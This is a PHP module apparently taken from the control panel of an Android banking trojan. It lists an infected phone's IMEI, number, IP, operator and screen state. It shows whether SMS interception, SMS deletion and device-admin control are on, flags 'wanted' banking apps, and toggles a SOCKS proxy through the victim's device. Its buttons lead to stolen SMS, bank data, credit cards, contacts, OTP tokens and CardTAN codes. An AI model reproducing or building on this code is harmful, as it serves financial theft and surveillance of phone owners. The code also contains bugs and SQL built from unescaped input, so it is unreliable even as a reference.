<?php
require_once "cmd_mod.php";

class bot extends modBase
{
	protected $module_name = 'bot';

	function get_content()
	{
		$bot_id = $this->db->quote($this->filter_values['bot_id']);
		
		$sql = <<<SQL
		select
		bots.id,
		bots.bot_id,
		UNIX_TIMESTAMP(bots.timestamp) as ts,
		UNIX_TIMESTAMP(bots.registered) as registered,
		bots.imei,
		bots.country,
		bots.operator,
		bots.android,
		bots.model,
		bots.number,
		bots.is_intercept,
		bots.comment,
		bots.marked_at,
		bots.ip,
		bots.is_sms_default_app,
		bots.is_admin,
		bots.tag,
		bots.lang,
		bots.is_screen_enabled,
		bots.phone_time,
		{$this->client_cfg['db_main']}.bot_socks.status as socks_status,
		{$this->client_cfg['db_main']}.bot_socks.is_online as socks_online,
		count(bot_tasks.id) as has_tasks
		from bots
LEFT JOIN {$this->client_cfg['db_main']}.bot_socks on bot_socks.bot_id COLLATE utf8_unicode_ci = bots.bot_id
LEFT JOIN bot_tasks on bot_tasks.bot_id COLLATE utf8_unicode_ci = bots.bot_id
		where bots.bot_id = {$bot_id}
SQL;
		
		$res = $this->db->exec($sql, null, true);
		if(!$res || $res[0]['id'] == '')
			return $this->wrap_content("Bot details", '', 0);
		
		$bot = $res[0];
		
		$rows = array();
		$rows[] = '<th colspan="2" class="textcenter">Activity</th>';
		$rows[] = array('Last activity', hlp::human_date($bot['ts']));
		$rows[] = array('Registered at', hlp::human_date($bot['registered']));

		$rows[] = array('Bot tasks', $this->get_task_cell($bot['bot_id'], $bot['has_tasks']));
		//~ $rows[] = array('Last command', 'TODO'); // hlp::get_last_result($bot['result'])
		//~ $rows[] = array('Last result', 'TODO'); // hlp::get_last_result($bot['result'])
		//~ $rows[] = array('Auto commands', $this->get_run_commands_cell($bot['run_commands']));
		
		$rows[] = '<th colspan="2" class="textcenter">Features</th>';
		$rows[] = array('SMS intercept', $this->get_boolean_cell($bot['is_intercept'], 'SMS Intercept enabled', 'SMS Intercept disabled'));
		$rows[] = array('Is device administrator', $this->get_boolean_cell($bot['is_admin'], 'Bot is device administrator', 'Bot is NOT device administrator'));
		
		$rows[] = array('Is SMS Deleter enabled', $this->get_sms_default_cell($bot['is_sms_default_app'], 'SMS Deleter enabled', 'SMS Deleter disabled'));
		
		$rows[] = array('Socks status', $this->get_socks_data($bot['socks_online'], $bot['bot_id']));
				
		$rows[] = '<th colspan="2" class="textcenter">Details</th>';
		$rows[] = array('Comment', $this->get_comment_cell($bot['id'], $bot['comment']));
		$rows[] = array('Phone number', $this->get_number_cell($bot['id'], $bot['number']));
		$rows[] = array('Bot ID', $bot['bot_id']);
		$rows[] = array('Tag', $this->get_tag_cell($bot['tag']));
		$rows[] = array('IMEI', $this->get_imei_cell($bot['imei']));
		
		$rows[] = array('IP', $this->get_ip_cell($bot['ip']));

		$rows[] = array('Country', $this->get_country_cell($bot['country']));
		$rows[] = array('Bot language', $this->get_language_cell($bot['lang']));
		$rows[] = array('Display enabled', ($bot['is_screen_enabled'])? '<i style="color: darkred">Yes, phone is in using</i>' : 'No, display switched off');
		$rows[] = array('Real phone time', $this->get_phone_time_cell($bot['phone_time']));
		$rows[] = array('Operator', $this->get_operator_cell($bot['operator']));
		$rows[] = array('Android version', $this->get_android_cell($bot['android']));
		$rows[] = array('Model', $bot['model']);
		
		$rows[] = array('Has wanted apps', $this->get_marked_cell($bot['bot_id']));

		$content = <<<PHP
		<h2 class='textcenter'>Bot details</h2>
		<script>
		core_context.bot_id = "{$bot['bot_id']}"
		</script>
PHP;
		$content .= $this->get_table($rows);
		

		$buttons = $this->get_buttons((bool) $bot['marked_at']);
		
		$title = "";
		if($bot['marked_at'])
			$title = "<button type='button' class='btn btn-circle btn-xs btn-danger' title='Bot marked manually at {$bot['marked_at']}'><i class='fa fa-inverse fa-warning'></i></button>&nbsp;&nbsp;&nbsp;" . $title;
			
		return $this->wrap_content($title, $content, 0, $buttons);
	}
	
	
	function get_phone_time_cell($ts)
	{
		if(!$ts || $ts == '0')
			return hlp::na_value();
			
		$t = date("d.m.y H:i", $ts);
		$hour = date("H", $ts);
		$hour = 10;
		if($hour < 6)
			$day_part = "night <i class='fa fa-moon-o'></i>";
		else if($hour >= 6 && $hour < 10)
			$day_part = "morning <i class='fa fa-sun-o'></i>";
		else if($hour >= 10 && $hour < 18)
			$day_part = "day <i class='fa fa-sun-o'></i>";
		else if($hour >= 18)
			$day_part = "evening <i class='fa fa-sun-o'></i>";

		$t .= ", {$day_part}";
		return $t; 
	}
	
	function get_android_cell($ver)
	{
		if($ver == '0') $ver = '';
		if(!trim($ver))
			return "";
			
		$name = hlp::get_android_name($ver);
		$recommend = '';
		if(strstr($ver, "."))
		{
			$parts = explode('.', $ver);
			$maj = (int) $parts[0];
			$min = (int) $parts[1];
			if($maj > 4 || ($maj == 4 && $min > 3) )
				$recommend = "<a href='#page:menu-extras;name=sms_deleter'>SMS deleter recommended</a>";
		}
		
		return <<<PHP
	<div class="row">
		<div class="col-md-8">
			{$ver} {$name}
		</div>
		<div class="col-md-4">
			{$recommend}
		</div>
	</div>
PHP;
	}

	function get_marked_cell($bot_id)
	{
		$wanted_apps = $this->get_wanted_apps($bot_id);
		if($wanted_apps)
			$val = "<i style='color: darkred'>".implode(', ', $wanted_apps)."</i>";
		else
			$val = "No";
			
		return <<<PHP
	<div class="row">
		<div class="col-md-8">
			{$val}
		</div>
		<div class="col-md-4">
			<a href='#page:menu-apps;bot_id={$bot_id}'>Show bot apps</a>
		</div>
	</div>
PHP;
	}
	
	function get_wanted_apps($bot_id)
	{
		$blocked_apps_filtered = array_map(array($this->db, 'quote'), $this->client_cfg['wanted_apps_list']);

		if(!sizeof($blocked_apps_filtered))
			return array();
			
		$blocked_apps_sql = implode(',', $blocked_apps_filtered);

		$block_sql = "SELECT `name` FROM apps WHERE `name` in({$blocked_apps_sql}) AND `id` in( select app_id from bot_apps where bot_id = '{$bot_id}' );";
		
		$res = $this->db->exec($block_sql, array(), true);
		if(!sizeof($res))
			return array();
			
		$apps = array();
		foreach($res as $r)
			$apps[] = $r['name'];
			
		return $apps;
	}
	
	function get_operator_cell($operator)
	{
		if($operator == '0' || !trim($operator)) 
			return '';
			
		return <<<PHP
	<div class="row">
		<div class="col-md-8">
			{$operator}
		</div>
		<div class="col-md-4">
			<a href='#page:menu-bots;bots-filter-operator={$operator}'>Show bots</a>
		</div>
	</div>
PHP;
	}

	function get_language_cell($language_code)
	{
		$data = hlp::get_flag($language_code, '', true);
		if(!strstr($data, "Unknown"))
		{
			$fullname = hlp::get_language_name($language_code);
			$wikilink = "<a href='https://en.wikipedia.org/wiki/{$fullname}' target='_blank'>wikipedia.org</a>";
		}else{
			$fullname = $wikilink = '';
		}
		
		$html = <<<PHP
	<div class="row">
		<div class="col-md-8">
			{$data} {$fullname}
		</div>
		<div class="col-md-4">
			{$wikilink}
		</div>
	</div>
PHP;

		return $html;
	}
	
	function get_country_cell($country_code)
	{
		$data = hlp::get_flag($country_code);
		if(!strstr($data, "Unknown"))
		{
			$fullname = hlp::get_country_name($country_code);
			$wikilink = "<a href='https://en.wikipedia.org/wiki/{$fullname}' target='_blank'>wikipedia.org</a>";
		}else{
			$fullname = $wikilink = '';
		}
		
		$html = <<<PHP
	<div class="row">
		<div class="col-md-8">
			{$data} {$fullname}
		</div>
		<div class="col-md-4">
			{$wikilink}
		</div>
	</div>
PHP;

		return $html;
	}

	function get_ip_cell($ip)
	{
		if(strstr($ip, ","))
			$ip = array_shift(explode(",", $ip));
			
		$html = <<<PHP
	<div class="row">
		<div class="col-md-8">
			{$ip}
		</div>
		<div class="col-md-2">
			<a href="https://www.infobyip.com/ip-{$ip}.html" target="_blank">Location</a>
		</div>
		<div class="col-md-2">
			<a href="https://www.infobyip.com/ipwhois-{$ip}.html" target="_blank">Whois</a>
		</div>
	</div>
PHP;

		return $html;
	}
	
	function get_imei_cell($imei)
	{
		$html = <<<PHP
	<div class="row">
		<div class="col-md-8">
			{$imei}
		</div>
		<div class="col-md-2">
			<a href="http://www.imei.info/?imei={$imei}" title="Detailed info, but captcha" target="_blank">imei.info</a>
		</div>
		<div class="col-md-2">
			<a href="https://imeidata.net/check?imei={$imei}" title="Basic info" target="_blank">imeidata.net</a>
		</div>
	</div>
PHP;

		return $html;
	}

	function get_tag_cell($tag)
	{

		$html = <<<PHP
	<div class="row">
		<div class="col-md-8">
			{$tag}
		</div>
		<div class="col-md-4">
			<a href='#page:menu-bots;bots-filter-tag={$tag}'>Show bots</a>
		</div>
	</div>
PHP;

		return $html;
	}

	function get_number_cell($bot_id, $number)
	{
		$number = ($number != '0')? trim($number) : '';
		
		return <<<PHP
	<textarea rows='1' placeholder='Not detected' class='form-control' cols='11'  id="bot_number-{$bot_id}" onkeypress="show_save_button(this)">{$number}</textarea>
	<button id='button-bot_number-{$bot_id}' style='width: 100%; display: none' type='button' class='btn btn-info' onclick="save_comment('{$bot_id}', 'bot_number')"><i class="fa fa-save" title=""></i></button>
PHP;
	}
	
	function get_comment_cell($bot_id, $comment)
	{
		$uniq_id = 'bot';
		
		$hide_field = $html = '';
		if(trim($comment))
		{
			$hide_link = 'display: none;';
			$hide_field = '';
		}else{
			$hide_link = '';
			$hide_field = 'display: none;';
		}
		
		$html .= <<<PHP
	<center id='addlink-{$bot_id}' style='{$hide_link}'><a style='font-size: 12pt; text-decoration: none; border-bottom: 1px dotted #1abc9c' href="javascript:show_comment_area('addlink-{$bot_id}', '{$uniq_id}-{$bot_id}'); undefined">Add</a></center>

	<textarea rows='1' class='form-control' cols='10' id="{$uniq_id}-{$bot_id}" style='{$hide_field}' onkeypress="show_save_button(this)" onkeydown="show_save_button(this)">{$comment}</textarea>
	<button id='button-{$uniq_id}-{$bot_id}' style='width: 100%; display: none' type='button' class='btn btn-info' onclick="save_comment('{$bot_id}', '{$uniq_id}')"><i class="fa fa-save" title=""></i></button>
PHP;
		return $html;
	}
	
	function get_sms_default_cell($data, $title_yes='', $title_no='')
	{
		$bool_icon = $this->get_boolean_cell($data, $title_yes, $title_no);

		$html = <<<PHP
<div class='row'>
	<div class='col-md-8'>{$bool_icon}</div>
	<div class='col-md-4'><a href='#page:menu-extras;name=sms_deleter'>Get SMS deleter feature</a></div>
</div>
PHP;
		return $html;
	}
	
	function get_boolean_cell($data, $title_yes='', $title_no='')
	{
		return ((int) $data) ?  
				hlp::get_bool_icon($title_yes, true) : hlp::get_bool_icon($title_no);
	}

	function get_task_cell($bot_id, $has_tasks)
	{
		
		if(!$has_tasks)
			return 'No tasks';
			
		$sql = "select count(id), status from bot_tasks where bot_id='{$bot_id}' group by status";
		
		$html = <<<PHP
			<button type="button" style='border: 1px solid white;' onclick='go_to_hash("tasks", {"bot_id": "{$bot_id}", "status": ""})' 
			data-toggle="tooltip" title='Show all tasks'
			class="btn">Show all</button>
PHP;

		$data = $this->db->exec($sql, null, true);
		foreach($data as $row)
		{
			$status_name = strip_tags(hlp::$tasks_statuses[$row['status']]);
			$class = hlp::get(hlp::$tasks_classes, $row['status'], '');
			$html .= <<<PHP
			<button type="button" onclick='go_to_hash("tasks", {"bot_id": "{$bot_id}", "status": "{$row['status']}"})' 
			data-toggle="tooltip" title='Show {$status_name} tasks'
			class="btn {$class}">{$row['count(id)']} {$status_name}</button>
PHP;
		}
		return $html;
	}
	
	function get_run_commands_cell($data)
	{
		// list of autocommands for each new bot, stored in json - archaic shit
		if(!$data)
			return '';
		
		$elems = json_decode(base64_decode($data), true);
		if(!$elems)
			return '';
			
		$auto_commands = '';
		foreach($elems as $command)
			$auto_commands .= json_encode($command) . "<br />";
			
		return $auto_commands;
	}

	function get_buttons($in_black)
	{
		$buttons = array(
			//array('Tasks', 'Show bot tasks', 'go_to_hash("tasks", {"bot_id": core_context.bot_id})', 'primary'),
			array('<i class="fa fa-android"></i><br />Apps', 'Show bot applications', 'go_to_hash("apps", {"bot_id": core_context.bot_id})', 'primary'),
			array('<span class="glyphicon glyphicon-send" aria-hidden="true"></span><br />SMS', 'Show bot SMS', 'go_to_hash("sms", {"bot_id": core_context.bot_id})', 'primary'),
			array('<i class="fa fa-institution"></i><br />Banks', 'Show bot banks data', 'go_to_hash("banks", {"bot_id": core_context.bot_id})', 'primary'),
			array('<i class="fa fa-credit-card"></i><br />Cards', 'Show bot credit cards', 'go_to_hash("cards", {"bot_id": core_context.bot_id})', 'primary'),
		);
		
		if(hlp::get($this->client_cfg, 'mod_contacts', false))
			$buttons[] = array('<i class="fa fa-address-book"></i><br />Contacts', 'Show bot phone contacts', 'go_to_hash("contacts", {"bot_id": core_context.bot_id})', 'info');
			
		if(hlp::get($this->client_cfg, 'mod_otp_tokens', false))
			$buttons[] = array('<i class="fa fa-key"></i><br />Tokens', 'Show bot OTP tokens', 'go_to_hash("tokens", {"bot_id": core_context.bot_id})', 'info');
			
		if(hlp::get($this->client_cfg, 'mod_cardtan', false))
			$buttons[] = array('<i class="fa fa-compass"></i><br />CardTAN', 'Show bot CardTAN coordinates', 'go_to_hash("cardtan", {"bot_id": "coordinates(core_context.bot_id})', 'info');
			
		if($in_black)
			$buttons[] = array('Remove marker', 'Remove manual marker from the bot', 'ajax_command("panel_mark_manually", {"bot_id": core_context.bot_id, "mode": "clean"}, true)', 'danger');
		else
			$buttons[] = array('Mark', 'Mark bot in bot list', 'ajax_command("panel_mark_manually", {"bot_id": core_context.bot_id}, true)', 'warning');
		
		return $buttons;
	}
	
	function get_socks_data($socks_online, $bot_id)
	{
		$icon_color = "F50808";
		$hint = "offline";
		$button_param = "start";

		if (!hlp::get($this->client_cfg, 'mod_socks', false))
		{
			$off = hlp::get_bool_icon("Socks disabled");
			$html = <<<PHP
	<div class="row">
		<div class="col-md-8">
			{$off}
		</div>
		<div class="col-md-4"><a href='#page:menu-extras;name=socks'>Get Socks feature</a></div></div>
PHP;
			return $html;
		}


		if($socks_online)
		{
			$icon = hlp::get_bool_icon("Socks enabled", true);
			$socks_status = $socks_online;

			if (isset($_SERVER["HTTP_X_FORWARDED_HOST"]))
				$socks_status = str_replace("{{HOSTNAME}}", $_SERVER["HTTP_X_FORWARDED_HOST"], $socks_status);
			else
				$socks_status = str_replace("{{HOSTNAME}}", $_SERVER["REMOTE_ADDR"], $socks_status);
				
			$button_param = "stop";
			$button_text = "Stop";
		}else{
			$icon = hlp::get_bool_icon("Socks disabled");
			$socks_status = "Offline";
			$button_param = "start";
			$button_text = "Start";
		}

		$html = <<<PHP
	<div class="row">
		<div class="col-md-1">
			{$icon}
		</div>
		<div class="col-md-1">
			{$socks_status}
		</div>
		<div class="col-md-10">
		<!-- socks-button data-bot_id='bot_id' -->
			<button class='btn btn-info btn-sm' switch_socks({$bot_id}, '{$button_param}')>{$button_text}</button>
		</div>
	</div>
PHP;
		return $html;
	}
	
}

















